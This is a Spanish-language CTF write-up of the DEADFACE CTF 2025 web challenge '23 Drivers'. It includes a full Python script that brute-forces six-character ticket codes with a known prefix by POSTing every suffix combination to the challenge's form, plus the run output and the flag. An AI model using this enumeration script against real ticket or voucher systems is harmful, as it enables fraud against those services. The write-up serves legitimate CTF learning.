---
title: "[Web] 23 Drivers - DEADFACE CTF 2025"
category: "web"
type: "writeup"
tags: ["web", "drivers", "deadface-ctf", "deadface-ctf-2025", "2025", "ctf-writeup"]
summary: "23 Drivers - DeadFaceCTF2025"
source:
  name: "CTFtime writeup #40525"
  url: "https://ctftime.org/writeup/40525"
original_source: "https://k3sero.github.io/posts/23_Drivers-DeadfaceCTF2025/"
ctf:
  name: "DEADFACE CTF 2025"
  year: 2025
  challenge: "[Web] 23 Drivers"
---

## Metadata

- **CTF:** DEADFACE CTF 2025
- **Task:** [Web] 23 Drivers
- **Author team:** Caliphal Hounds
- **CTFtime:** <https://ctftime.org/writeup/40525>
- **Original writeup:** <https://k3sero.github.io/posts/23_Drivers-DeadfaceCTF2025/>

---
23 Drivers - DeadFaceCTF2025 __

Contenido __

23 Drivers - DeadFaceCTF2025

__

Autor del reto: `Desconocido`

Dificultad: Fácil

## Enunciado __

____

`

```
    1
    2
    3
    4
```

| 

```
    My favorite band 'Twenty Three Drivers' gave away some free tickets to there upcoming secret show.
    From a fanforum you know some of these codes (23D8BG / 23DAL2 / 23DR0S), but they are all used.
    
    Can you help me get a free ticket for this show?
```  
  
---|---  
`

## Archivos __

  * `https://23drivers.ctf.zone/`: Página web principal del grupo de música.


Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers).

## Analizando el reto __

Al entrar en la página web del grupo de música encontramos su página principal.

[![main_page](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/1.png)](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/1.png)

[![main_page_code](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/2.png)](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/2.png)

El enunciado indica que varios códigos gratuitos `23D8BG` `23DAL2` `23DR0S` ya han sido reclamados.

## Solver __

Si nos fijamos en los códigos gratuitos, todos empiezan por los caracteres`23D` y cuentan con un total de 6 caracteres.

Para obtener un código válido, se utilizará un ataque de fuerza bruta básico contra la sección `Win Action` para obtener el código válido que nos permita obtener una entrada gratuita.

El script en python final es el siguiente:

____

`

```
    1
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
```

| 

```
     import requests
    import itertools
    import string
    from time import sleep
    from tqdm import tqdm
    
    url = "https://23drivers.ctf.zone/"
    field_name = "secret_code"
    prefix = "23D"
    chars = string.ascii_uppercase + string.digits
    suffix_len = 3
    
    msg_used = "already used"       
    msg_invalid = "unknown code!"
    
    session = requests.Session()
    
    def gen_codes():
        for tup in itertools.product(chars, repeat=suffix_len):
            yield prefix + ''.join(tup)
    
    def try_code(code):
        data = {field_name: code}
        r = session.post(url, data=data, timeout=10)
        return r
    
    def main():
        for i, code in tqdm(enumerate(gen_codes(), start=1)):
            r = try_code(code)
            text_lower = r.text.lower()
    
            if msg_used.lower() in text_lower:
                pass 
            elif msg_invalid.lower() in text_lower:
                pass 
            else:
                print(f"[VALID] {code}")
                print("Snippet:\n", r.text[:500])
                return 
    
            if i % 500 == 0:
                print(f"Probados {i} códigos...")
    
    if __name__ == "__main__":
        main()
```  
  
---|---  
`

____

`

```
    1
    2
    3
    4
```

| 

```
    ┌──(kesero㉿kali)-[~]
    └─$ python solver.py
    
        [VALID] 23DF2W
```  
  
---|---  
`

Una vez obtenido el código `23DF2W` válido, se canjeará en la página web para obtener la entrada gratuita.

[![entrada](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/3.png)](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/DeadfaceCTF2025/Web/twenty%20Three%20Drivers/3.png)

La flag se encuentra al escanear el código de la entrada al concierto.

## Flag __

`flag{5c2eb61a39c2528008508b687d0af328}`

__[Writeups Competiciones Internacionales](https://k3sero.github.io/categories/writeups-competiciones-internacionales/), [Web](https://k3sero.github.io/categories/web/)

__[Web](https://k3sero.github.io/tags/web/) [Web - Fuerza Bruta](https://k3sero.github.io/tags/web-fuerza-bruta/) [Otros - Writeups](https://k3sero.github.io/tags/otros-writeups/) [Dificultad - Fácil](https://k3sero.github.io/tags/dificultad-f%C3%A1cil/) [DeadFaceCTF](https://k3sero.github.io/tags/deadfacectf/)

Esta entrada está licenciada bajo [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) por el autor.

Compartir [ __](https://twitter.com/intent/tweet?text=23%20Drivers%20-%20DeadFaceCTF2025%20-%20Kesero&url=https%3A%2F%2Fk3sero.github.io%2Fposts%2F23_Drivers-DeadfaceCTF2025%2F "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=23%20Drivers%20-%20DeadFaceCTF2025%20-%20Kesero&u=https%3A%2F%2Fk3sero.github.io%2Fposts%2F23_Drivers-DeadfaceCTF2025%2F "Facebook") [ __](https://t.me/share/url?url=https%3A%2F%2Fk3sero.github.io%2Fposts%2F23_Drivers-DeadfaceCTF2025%2F&text=23%20Drivers%20-%20DeadFaceCTF2025%20-%20Kesero "Telegram") __
